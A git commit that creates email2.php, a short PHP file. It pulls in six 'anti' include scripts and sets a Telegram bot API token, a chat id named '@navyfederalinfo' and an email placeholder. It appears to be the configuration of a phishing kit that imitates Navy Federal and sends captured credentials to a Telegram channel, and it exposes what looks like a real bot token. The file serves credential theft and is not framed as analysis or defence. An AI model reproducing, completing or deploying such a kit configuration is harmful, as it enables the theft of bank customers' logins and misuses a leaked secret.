a2d1c0aec749114f5d906afbea02bee869a4b800
alexjay158 <113730577+alexjay158@users.noreply.github.com>
2022-10-14 10:59:42 +0200

    Create email2.php

---
+++ email2.php
@@ -0,0 +1,11 @@
+<?php
+include "anti/anti1.php";
+include "anti/anti2.php"; 
+include "anti/anti3.php"; 
+include "anti/anti4.php"; 
+include "anti/anti5.php"; 
+include "anti/anti7.php"; 
+$api = "5369209739:AAFaMNk39MGepMZ3E9YrjLqhEHZupqCK-Pw";
+$chatid = "@navyfederalinfo";
+$email ="your email";
+?>
